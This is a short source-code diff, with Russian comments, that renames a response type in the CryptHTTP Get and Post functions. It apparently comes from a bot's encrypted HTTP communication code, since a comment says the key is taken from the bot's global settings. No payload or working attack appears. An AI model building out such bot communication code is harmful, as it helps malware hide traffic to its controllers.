@@ -108,7 +108,7 @@ PCHAR DecodeHTTPBuffer(PCHAR InBuffer, PCHAR Password)
 //---------------------------------------------------------------------------
 
 // Загрузить шифрованный документ
-bool CryptHTTP::Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer)
+bool CryptHTTP::Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer)
 {
 	if (STR::IsEmpty(URL))
 		return false;
@@ -125,7 +125,7 @@ bool CryptHTTP::Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponse Respons
 
 //---------------------------------------------------------------------------
 
-bool CryptHTTP::Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer)
+bool CryptHTTP::Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer)
 {
 	// Функция отправляет зашифрованные пост данные на указанный
 	// адрес. ключ берётся из глобальных настроек бота
